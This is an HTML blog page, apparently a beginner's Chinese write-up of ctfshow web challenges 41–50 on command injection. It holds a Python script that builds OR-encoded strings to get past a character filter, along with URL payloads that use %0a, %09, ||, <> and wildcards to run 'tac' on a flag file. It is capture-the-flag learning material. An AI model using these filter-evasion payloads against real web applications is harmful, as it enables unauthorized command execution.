@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>ctfshow-web入门-命令篇(三)[41-] | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="web41 这题太难了完全不是我这种web新手和编程新手能写的  甚至代码都看不懂  所以先用之后在理解 想了解入口:CTFshow wbe41 教你写脚本_ctfshow web41-CSDN博客   1.看见他把0-9和a-z过滤了直接懵逼     2.直接看大佬写的脚本(python脚本) import reimport urllibfrom urllib import parsehex_i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow-web入门-命令篇(三)[41-]">
+<meta property="og:url" content="http://example.com/2025/01/25/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%B8%89)[41-]/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="web41 这题太难了完全不是我这种web新手和编程新手能写的  甚至代码都看不懂  所以先用之后在理解 想了解入口:CTFshow wbe41 教你写脚本_ctfshow web41-CSDN博客   1.看见他把0-9和a-z过滤了直接懵逼     2.直接看大佬写的脚本(python脚本) import reimport urllibfrom urllib import parsehex_i">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/679481d61bd1c.png">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/679482db0aae2.png">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/679484487cbcf.png">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/679484a704f88.png">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/67949276ecd09.png">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/679493c8be5e1.png">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/6794942d4df1b.png">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/67949c9cb6f04.png">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/67949e58bbb95.png">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/67949d654479f.png">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/6794a15d94fdd.png">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/6794b8b83307e.png">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/6794b93111f25.png">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/6794b992b3612.png">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/6794bdf3a5b73.png">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/6794c5974249e.png">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/6794bf750b912.png">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/6794c960591ef.png">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/6794ca817bbb5.png">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/6794cb1c67419.png">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/6794cb64417b1.png">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/6794cec29b061.png">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/6794cf2d8d0bc.png">
+<meta property="og:image" content="https://www.helloimg.com/i/2025/01/25/6794cf812f0e2.png">
+<meta property="article:published_time" content="2025-01-25T04:58:01.000Z">
+<meta property="article:modified_time" content="2025-01-25T11:56:48.853Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.helloimg.com/i/2025/01/25/679481d61bd1c.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-ctfshow-web入门-命令篇(三)[41-]" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/25/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%B8%89)%5B41-%5D/" class="article-date">
+  <time class="dt-published" datetime="2025-01-25T04:58:01.000Z" itemprop="datePublished">2025-01-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      ctfshow-web入门-命令篇(三)[41-]
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>web41</strong></p>
+<p>这题太难了完全不是我这种web新手和编程新手能写的  甚至代码都看不懂  所以先用之后在理解</p>
+<p>想了解入口:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40345591/article/details/127773706">CTFshow wbe41 教你写脚本_ctfshow web41-CSDN博客</a></p>
+<img src="https://www.helloimg.com/i/2025/01/25/679481d61bd1c.png" title alt style="zoom:33%;">
+
+<p>1.看见他把0-9和a-z过滤了直接懵逼  </p>
+<img src="https://www.helloimg.com/i/2025/01/25/679482db0aae2.png" title alt style="zoom:33%;">
+
+<p>2.直接看大佬写的脚本(python脚本)</p>
+<p><em><em>import re<br>import urllib<br>from urllib import parse<br>hex_i &#x3D; “”<br>hex_j &#x3D; “”<br>pattern&#x3D;’&#x2F;[0-9]|[a-z]|^|+|~|$|[|]|{|}|&amp;|-&#x2F;i’           #题目中过滤的内容<br>str1&#x3D;[“system”,”tac fla</em>“]                                       #所需编码的内容<br>for p in range(2):<br>    t1 &#x3D; “”<br>    t2 &#x3D; “”<br>    for k in str1[p]:<br>        for i in range(256):<br>            for j in range(256):<br>                if re.search(pattern,chr(i)) :<br>                    break<br>                if re.search(pattern,chr(j)) :<br>                    continue<br>                if i &lt; 16:<br>                    hex_i &#x3D; “0” + hex(i)[2:]<br>                else:<br>                    hex_i&#x3D;hex(i)[2:]<br>                if j &lt; 16:<br>                    hex_j&#x3D;”0”+hex(j)[2:]<br>                else:<br>                    hex_j&#x3D;hex(j)[2:]<br>                hex_i&#x3D;’%’+hex_i<br>                hex_j&#x3D;’%’+hex_j<br>                c&#x3D;chr(ord(urllib.parse.unquote(hex_i))|ord(urllib.parse.unquote(hex_j)))<br>                if(c &#x3D;&#x3D;k):<br>                    t1&#x3D;t1+hex_i<br>                    t2&#x3D;t2+hex_j<br>                    break<br>            else:<br>                continue<br>            break<br>    print(“(&quot;“+t1+”&quot;|&quot;“+t2+”&quot;)”)</em>*</p>
+<p>3.通过修改编码内容完成过滤  运行脚本(python  file.py)</p>
+<p><img src="https://www.helloimg.com/i/2025/01/25/679484487cbcf.png"></p>
+<p>4.然后在抓包软件输入结果然后得到flag</p>
+<img src="https://www.helloimg.com/i/2025/01/25/679484a704f88.png" title alt style="zoom:33%;">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<p>先介绍知识:</p>
+<p>”&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1“可以用;、||、%26、%0a过滤</p>
+<p>更深原理入口:<a target="_blank" rel="noopener" href="https://blog.csdn.net/albertsh/article/details/132033812">linux环境下运行脚本时常用＞&#x2F;dev&#x2F;null 2＞&amp;1 &amp;这一串的作用_&gt;nul 2&gt;&amp;1-CSDN博客</a></p>
+<p><strong>web42</strong></p>
+<img src="https://www.helloimg.com/i/2025/01/25/67949276ecd09.png" title alt style="zoom:33%;">
+
+<p>进入后发现没有过滤只有”&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1“</p>
+<p><img src="https://www.helloimg.com/i/2025/01/25/679493c8be5e1.png"></p>
+<p>然后利用上面的绕过得到flag</p>
+<img src="https://www.helloimg.com/i/2025/01/25/6794942d4df1b.png" title alt style="zoom:33%;">
+
+
+
+
+
+
+
+
+
+
+
+<p><strong>web43</strong></p>
+<img src="https://www.helloimg.com/i/2025/01/25/67949c9cb6f04.png" title alt style="zoom:33%;">
+
+<p>进入后看到多了两个过滤;和cat</p>
+<p><strong>cat</strong>可用<strong>tac</strong>代替</p>
+<p>;<strong>可用</strong>%0a等代替</p>
+<img src="https://www.helloimg.com/i/2025/01/25/67949e58bbb95.png" title alt style="zoom:50%;">
+
+<p>如</p>
+<img src="https://www.helloimg.com/i/2025/01/25/67949d654479f.png" title alt style="zoom:33%;">
+
+
+
+
+
+
+
+
+
+
+
+<p><strong>web44</strong></p>
+<p>与web43相比  多了flag过滤</p>
+<p>可以用*或?过滤</p>
+<p>**:<em>匹配0个或多个字符  如:fla</em> *    </p>
+<p>?是匹配1和字符  如:fla?.php</p>
+<p>所以直接改造 :  ?c&#x3D;tac fla?php%0a</p>
+<img src="https://www.helloimg.com/i/2025/01/25/6794a15d94fdd.png" title alt style="zoom:33%;">
+
+
+
+
+
+
+
+
+
+<p><strong>web45</strong></p>
+<img src="https://www.helloimg.com/i/2025/01/25/6794b8b83307e.png" title alt style="zoom:33%;">
+
+<p>发现比上一题多过滤了空格</p>
+<p>空格可以用%09等代替</p>
+<p><img src="https://www.helloimg.com/i/2025/01/25/6794b93111f25.png"></p>
+<p>构造:?c&#x3D;tac%09fla*%0a</p>
+<p><img src="https://www.helloimg.com/i/2025/01/25/6794b992b3612.png"></p>
+<p><strong>web46</strong></p>
+<img src="https://www.helloimg.com/i/2025/01/25/6794bdf3a5b73.png" title alt style="zoom:33%;">
+
+<p>这次多过滤了*和0-9</p>
+<p>但%09和%0a是url   而0-9数字不包括url编码的数字</p>
+<p>所以这次只需要和前面<strong>web45</strong>修改用?过滤</p>
+<p><img src="https://www.helloimg.com/i/2025/01/25/6794c5974249e.png"></p>
+<p>构造:?c&#x3D;tac%09fla?.php%0a</p>
+<p><img src="https://www.helloimg.com/i/2025/01/25/6794bf750b912.png"></p>
+<p><strong>web47和web48</strong></p>
+<p>和web46一样  新的过滤不影响</p>
+<img src="https://www.helloimg.com/i/2025/01/25/6794c960591ef.png" title alt style="zoom:33%;">
+
+<p><img src="https://www.helloimg.com/i/2025/01/25/6794ca817bbb5.png"></p>
+<p><strong>web49</strong></p>
+<p><img src="https://www.helloimg.com/i/2025/01/25/6794cb1c67419.png"></p>
+<p>虽然过滤了%  但是不包括url编码的%</p>
+<p>所以构造相同</p>
+<img src="https://www.helloimg.com/i/2025/01/25/6794cb64417b1.png" title alt style="zoom:33%;">
+
+
+
+
+
+<p><strong>web50</strong></p>
+<img src="https://www.helloimg.com/i/2025/01/25/6794cec29b061.png" title alt style="zoom:33%;">
+
+<p>发现过滤了%09和%26</p>
+<p><img src="https://www.helloimg.com/i/2025/01/25/6794cf2d8d0bc.png"></p>
+<p>%09用&lt;&gt;代替</p>
+<p>%26用||代替</p>
+<p>但我不知道为啥**匹配符合?**不可以用了</p>
+<p>所以把fla?.php改为fla\g.php或者fla’’g.php</p>
+<p>构造:?c&#x3D;tac&lt;&gt;fla\g.php||或者?c&#x3D;tac&lt;&gt;fla’’g.php||</p>
+<p><img src="https://www.helloimg.com/i/2025/01/25/6794cf812f0e2.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/25/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%B8%89)[41-]/" data-id="cm6c4yj6o000084cxbmg7c6d5" data-title="ctfshow-web入门-命令篇(三)[41-]" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2025/01/23/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%BA%8C)%5B35-40%5D/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">ctfshow-web入门-命令篇(二)[35-40]</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/01/25/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%B8%89)%5B41-%5D/">ctfshow-web入门-命令篇(三)[41-]</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/23/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%BA%8C)%5B35-40%5D/">ctfshow-web入门-命令篇(二)[35-40]</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/21/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%B8%80)%5B29-34%5D/">ctfshow-web入门-命令篇(一)[29-34]</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/19/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4%E7%AF%87-(%E4%BA%8C)%5B26-28%5D/">ctfshow-web入门-爆破篇-(二)[26-28]</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/15/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4%E7%AF%87%20(%E4%B8%80)%5B21-25%5D/">ctfshow-web入门-爆破篇 (一)[21-25]</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
